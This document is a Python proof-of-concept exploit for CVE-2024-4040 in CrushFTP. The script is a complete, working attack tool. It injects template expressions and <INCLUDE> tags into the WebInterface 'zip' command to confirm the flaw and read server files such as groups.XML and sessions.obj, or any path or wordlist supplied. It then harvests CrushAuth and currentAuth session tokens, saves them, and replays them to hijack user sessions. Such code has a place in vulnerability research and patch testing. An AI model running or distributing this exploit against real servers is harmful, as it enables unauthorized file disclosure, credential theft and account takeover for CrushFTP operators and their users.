#!/usr/bin/python3

import requests
import argparse
import re
import urllib3
import xml.etree.ElementTree as ET
from rich.console import Console
from rich.progress import Progress
from urllib.parse import urlparse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


console = Console(highlight=False)


def banner():
    console.print("CrushFTP SSTI PoC (CVE-2024-4040)")
    console.print("Developer: @stuub")

def serverSessionAJAX(target, session):

    console.print("[*] Attempting to reach ServerSessionAJAX...\n")

    url = f"{target}/WebInterface/"

    try:
        response = session.get(url, verify=False, allow_redirects=True)

        if response.status_code == 404:
            console.print("[+] Successfully reached ServerSessionAJAX")
            if 'CrushAuth' in response.cookies and 'currentAuth' in response.cookies:
                crush_auth_cookie = response.cookies['CrushAuth']
                current_auth_cookie = response.cookies['currentAuth']
                console.print("[i] CrushAuth Session token: " + crush_auth_cookie)
                console.print("[i] Current Auth Session token: " + current_auth_cookie)
                return crush_auth_cookie, current_auth_cookie
            else:
                console.print("[-] 'CrushAuth' or 'currentAuth' cookie not found in the response")
                exit(1)

    except requests.exceptions.RequestException as e:
        console.print("[-] Failed to reach ServerSessionAJAX")
        console.print("[-] Error: " + str(e))
        exit(1)

def SSTI(target, crush_auth_cookie, current_auth_cookie, session):

    console.print("\n[*] Attempting to exploit SSTI vulnerability...")

    url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path={{hostname}}&names=/a"
    console.print("\n[i] URL: {}".format(url))

    headers = {
        "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
    }

    try:
        response = session.post(url, headers=headers, verify=False, allow_redirects=True)

        if response.status_code == 200 and "{hostname}" not in response.text and "Access Denied" not in response.text:
            console.print("[+] Successfully exploited SSTI, server is vulnerable")
            root = ET.fromstring(response.text)
            response_text = root.find('response').text
            console.print("[+] Response: " + response_text)
        
        else:
            console.print("[-] SSTI was not successful, server is OK.")
            console.print("[-] Response: " + response.text)
            exit(1)

    except requests.exceptions.RequestException as e:
        console.print("[-] Failed to exploit SSTI vulnerability")
        console.print("[-] Error: " + str(e))
        exit(1)
    
    users = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>users/MainUsers/groups.XML</INCLUDE>&names=/a"
    console.print("\n[i] Attempting to extract users/MainUsers/groups.XML...")
    console.print("\n[+] URL: " + users)

    try:
        response = session.post(users, headers=headers, verify=False, allow_redirects=True)

        if response.status_code == 200 and response.text != "":
            console.print("[i] Successfully extracted users/MainUsers/groups.XML")
            console.print("[+] Extracted response: \n" + response.text)

        else:
            console.print("[-] Failed to extract users/MainUsers/groups.XML")
            exit(1)
    except requests.exceptions.RequestException as e:
        console.print("[-] Failed to extract users/MainUsers/groups.XML")
        console.print("[-] Error: " + str(e))
        exit(1)

def authBypass(target, crush_auth_cookie, current_auth_cookie, session, lfi=None):
    
        console.print("[*] Attempting to bypass authentication...")
    
        url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path={{working_dir}}&names=/a"
        console.print("\n[+] URL: " + url)
        headers = {
            "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
        }
    
        try:
            response = session.post(url, headers=headers, verify=False, allow_redirects=True)
        
            if "{working_dir}" in response.text:
                console.print("[-] Bypass was not successful, server is OK.")
                console.print("[-] Response: " + response.text)
                exit(1)

            if response.status_code == 200 and response.text != "":
                console.print("[+] Extracted response: \n" + response.text)

                root = ET.fromstring(response.text)
                response_text = root.find('response').text
                matches = re.findall(r'file:(.*?)(?=\n|$)', response_text)            
                if matches:
                    install_dir = matches[-1].strip()
                    console.print("[+] Installation directory of CrushFTP: " + install_dir)
                    file_to_read = lfi if lfi else f"{install_dir}sessions.obj"
                    console.print("[+] File to read: " + file_to_read)
                    
                    url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>{file_to_read}</INCLUDE>&names=/a"
                    console.print(f"\n[+] Attempting to extract {file_to_read}...")
                    console.print(f"\n[+] URL: " + url)
                    response = session.post(url, headers=headers, verify=False, allow_redirects=True)

                    if response.status_code == 200 and response.text != "":
                        console.print(f"[+] Successfully extracted {file_to_read}")
                        escaped_text = response.text.replace("[", "\\[").replace("]", "\\]")

                        console.print(f"[+] Extracted response: \n" + escaped_text)
                        if not lfi or lfi == f"{install_dir}sessions.obj":
                            extracted_crush_auth = [cookie[:44] for cookie in re.findall(r'CrushAuth=([^;]*)', response.text)]
                            extracted_current_auth = [cookie[:4] for cookie in re.findall(r'currentAuth=([^;]*)', response.text)]

                            console.print(f"\n[+] Extracted cookies from {file_to_read}: ")
                            console.print(f"\n[+] CrushAuth cookies: " + ', '.join(extracted_crush_auth))
                            console.print(f"\n[+] currentAuth cookies: " + ', '.join(extracted_current_auth))
                            with open (f"sessions.obj", "w") as f:
                                f.write(response.text)
                            return extracted_crush_auth, extracted_current_auth
                    return None, None
                else:
                    print("[-] Failed to extract file value")
                    return None
                
        except requests.exceptions.RequestException as e:
            console.print("[-] Failed to bypass authentication")
            console.print("[-] Error: " + str(e))
            exit(1)

def lfi_wordlist(target, crush_auth_cookie, current_auth_cookie, wordlist,session):

    console = Console()
    with open(wordlist, 'r') as f:
        files = [line.strip() for line in f]

    with Progress(console=console) as progress:
        task = progress.add_task("Processing wordlist...", total=len(files))

        for file in files:
            if progress.finished: break

            console.print(f"\n[*] Attempting to read file: {file}")

            url = f"{target}/WebInterface/function/?c2f={current_auth_cookie}&command=zip&path=<INCLUDE>{file}</INCLUDE>&names=/a"
            headers = {
                "Cookie": f"CrushAuth={crush_auth_cookie}; currentAuth={current_auth_cookie}"
            }

            try:
                response = session.post(url, headers=headers, verify=False, allow_redirects=True)

                if response.status_code == 200:
                    console.print("[+] Successfully read file: {file}")
                    console.print("[+] Response: \n" + response.text)

                progress.update(task, advance=1)
                
            except requests.exceptions.RequestException as e:
                console.print(f"[-] Failed to read file: {file}")
                console.print("[-] Error: " + str(e))

def test_tokens(target, crush_auth_cookie, current_auth_cookie, session):
    console = Console()

    if isinstance(crush_auth_cookie, str):
        crush_auth_cookie = crush_auth_cookie.split(', ')
    if isinstance(current_auth_cookie, str):
        current_auth_cookie = current_auth_cookie.split(', ')

    for crush_auth_token, current_auth_token in zip(crush_auth_cookie, current_auth_cookie):
        url = f"{target}/WebInterface/function?command=getUsername&c2f={current_auth_token}"
        headers = {
            "Cookie": f"CrushAuth={crush_auth_token}; currentAuth={current_auth_token}"
        }
        
        console.print(f"\n[+] Testing tokens: CrushAuth={crush_auth_token}, currentAuth={current_auth_token}")
        try:
            response = session.post(url, headers=headers, verify=False, allow_redirects=True)

            if response.status_code == 200:
                console.print("[+] Response: " + response.text)
            
        except requests.exceptions.RequestException as e:
            console.print(f"Failed to test tokens: CrushAuth={crush_auth_token}, currentAuth={current_auth_token}")
            console.print("Error: " + str(e))

def main():
    parser = argparse.ArgumentParser(description="CrushFTP SSTI PoC (CVE-2024-4040)")
    parser.add_argument("-t", "--target", help="Target CrushFTP URL", required=True)
    parser.add_argument("-l", "--lfi", help="Local File Inclusion")
    parser.add_argument("-w", "--wordlist", help="Wordlist for LFI")
    args = parser.parse_args()
    parsed_url = urlparse(args.target)
    stripped_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    args.target = stripped_url
    banner()

    global session
    session = requests.Session()
    
    console.print("\n[*] Attempting to retrieve CrushAuth and currentAuth tokens...")
    auth_tokens = serverSessionAJAX(target=args.target, session=session)

    if auth_tokens is None:
        console.print("[-] Failed to retrieve CrushAuth and currentAuth tokens.")
        exit(1)
    crush_auth_cookie, current_auth_cookie = auth_tokens


    SSTI(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, session=session)
    extracted_crush_auth, extracted_current_auth = authBypass(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, lfi=args.lfi, session=session)
    if args.wordlist:
        lfi_wordlist(target=args.target, crush_auth_cookie=crush_auth_cookie, current_auth_cookie=current_auth_cookie, wordlist=args.wordlist, session=session)
    if not args.lfi or args.lfi == 'sessions.obj':
        test_tokens(target=args.target, crush_auth_cookie=extracted_crush_auth, current_auth_cookie=extracted_current_auth, session=session)

if __name__ == "__main__":
    main()
